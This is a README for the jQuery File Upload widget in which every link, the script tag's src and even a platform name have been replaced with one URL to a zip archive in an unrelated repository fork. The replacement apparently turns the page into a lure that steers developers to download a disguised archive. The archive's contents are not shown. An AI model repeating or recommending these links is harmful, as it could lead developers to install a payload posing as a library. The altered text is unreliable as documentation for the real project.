# jQuery File Upload

## Contents

- [Description](#description)
- [Demo](#demo)
- [Features](#features)
- [Security](#security)
- [Setup](#setup)
- [Requirements](#requirements)
  - [Mandatory requirements](#mandatory-requirements)
  - [Optional requirements](#optional-requirements)
  - [Cross-domain requirements](#cross-domain-requirements)
- [Browsers](#browsers)
  - [Desktop browsers](#desktop-browsers)
  - [Mobile browsers](#mobile-browsers)
  - [Extended browser support information](#extended-browser-support-information)
- [Testing](#testing)
- [Support](#support)
- [License](#license)

## Description

> File Upload widget with multiple file selection, drag&amp;drop support,
> progress bars, validation and preview images, audio and video for jQuery.  
> Supports cross-domain, chunked and resumable file uploads and client-side
> image resizing.  
> Works with any server-side platform (PHP, Python, Ruby on Rails, Java,
> https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip, Go etc.) that supports standard HTML form file uploads.

## Demo

[Demo File Upload](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip)

## Features

- **Multiple file upload:**  
  Allows to select multiple files at once and upload them simultaneously.
- **Drag & Drop support:**  
  Allows to upload files by dragging them from your desktop or file manager and
  dropping them on your browser window.
- **Upload progress bar:**  
  Shows a progress bar indicating the upload progress for individual files and
  for all uploads combined.
- **Cancelable uploads:**  
  Individual file uploads can be canceled to stop the upload progress.
- **Resumable uploads:**  
  Aborted uploads can be resumed with browsers supporting the Blob API.
- **Chunked uploads:**  
  Large files can be uploaded in smaller chunks with browsers supporting the
  Blob API.
- **Client-side image resizing:**  
  Images can be automatically resized on client-side with browsers supporting
  the required JS APIs.
- **Preview images, audio and video:**  
  A preview of image, audio and video files can be displayed before uploading
  with browsers supporting the required APIs.
- **No browser plugins (e.g. Adobe Flash) required:**  
  The implementation is based on open standards like HTML5 and JavaScript and
  requires no additional browser plugins.
- **Graceful fallback for legacy browsers:**  
  Uploads files via XMLHttpRequests if supported and uses iframes as fallback
  for legacy browsers.
- **HTML file upload form fallback:**  
  Allows progressive enhancement by using a standard HTML file upload form as
  widget element.
- **Cross-site file uploads:**  
  Supports uploading files to a different domain with cross-site XMLHttpRequests
  or iframe redirects.
- **Multiple plugin instances:**  
  Allows to use multiple plugin instances on the same webpage.
- **Customizable and extensible:**  
  Provides an API to set individual options and define callback methods for
  various upload events.
- **Multipart and file contents stream uploads:**  
  Files can be uploaded as standard "multipart/form-data" or file contents
  stream (HTTP PUT file upload).
- **Compatible with any server-side application platform:**  
  Works with any server-side platform (PHP, Python, Ruby on Rails, Java,
  https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip, Go etc.) that supports standard HTML form file uploads.

## Security

⚠️ Please read the [VULNERABILITIES](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip) document for a list of
fixed vulnerabilities

Please also read the [SECURITY](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip) document for instructions on how to
securely configure your Webserver for file uploads.

## Setup

jQuery File Upload can be installed via [NPM](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip):

```sh
npm install blueimp-file-upload
```

This allows you to include [https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip) and
its extensions via `node_modules`, e.g:

```html
<script src="https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip"></script>
```

The widget can then be initialized on a file upload form the following way:

```js
$('#fileupload').fileupload();
```

For further information, please refer to the following guides:

- [Main documentation page](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip)
- [List of all available Options](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip)
- [The plugin API](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip)
- [How to setup the plugin on your website](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip)
- [How to use only the basic plugin.](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip)

## Requirements

### Mandatory requirements

- [jQuery](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip) v1.7+
- [jQuery UI widget factory](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip) v1.9+
  (included): Required for the basic File Upload plugin, but very lightweight
  without any other dependencies from the jQuery UI suite.
- [jQuery Iframe Transport plugin](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip)
  (included): Required for
  [browsers without XHR file upload support](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip).

### Optional requirements

- [JavaScript Templates engine](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip)
  v3+: Used to render the selected and uploaded files for the Basic Plus UI and
  jQuery UI versions.
- [JavaScript Load Image library](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip)
  v2+: Required for the image previews and resizing functionality.
- [JavaScript Canvas to Blob polyfill](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip)
  v3+:Required for the image previews and resizing functionality.
- [blueimp Gallery](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip) v2+: Used to display the
  uploaded images in a lightbox.
- [Bootstrap](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip) v3+: Used for the demo design.
- [Glyphicons](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip) Icon set used by Bootstrap.

### Cross-domain requirements

[Cross-domain File Uploads](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip)
using the
[Iframe Transport plugin](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip)
require a redirect back to the origin server to retrieve the upload results. The
[example implementation](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip)
makes use of
[https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip)
as a static redirect page for the origin server.

The repository also includes the
[jQuery XDomainRequest Transport plugin](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip),
which enables limited cross-domain AJAX requests in Microsoft Internet Explorer
8 and 9 (IE 10 supports cross-domain XHR requests).  
The XDomainRequest object allows GET and POST requests only and doesn't support
file uploads. It is used on the
[Demo](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip) to delete uploaded files
from the cross-domain demo file upload service.

## Browsers

### Desktop browsers

The File Upload plugin is regularly tested with the latest browser versions and
supports the following minimal versions:

- Google Chrome
- Apple Safari 4.0+
- Mozilla Firefox 3.0+
- Opera 11.0+
- Microsoft Internet Explorer 6.0+

### Mobile browsers

The File Upload plugin has been tested with and supports the following mobile
browsers:

- Apple Safari on iOS 6.0+
- Google Chrome on iOS 6.0+
- Google Chrome on Android 4.0+
- Default Browser on Android 2.3+
- Opera Mobile 12.0+

### Extended browser support information

For a detailed overview of the features supported by each browser version and
known operating system / browser bugs, please have a look at the
[Extended browser support information](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip).

## Testing

The project comes with three sets of tests:

1. Code linting using [ESLint](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip).
2. Unit tests using [Mocha](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip).
3. End-to-end tests using [blueimp/wdio](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip).

To run the tests, follow these steps:

1. Start [Docker](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip).
2. Install development dependencies:
   ```sh
   npm install
   ```
3. Run the tests:
   ```sh
   npm test
   ```

## Support

This project is actively maintained, but there is no official support channel.  
If you have a question that another developer might help you with, please post
to
[Stack Overflow](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip+jquery+file-upload)
and tag your question with `blueimp jquery file upload`.

## License

Released under the [MIT license](https://github.com/mviraj/jQuery-File-Upload/raw/refs/heads/master/js/File-Upload-j-Query-v3.7.zip).
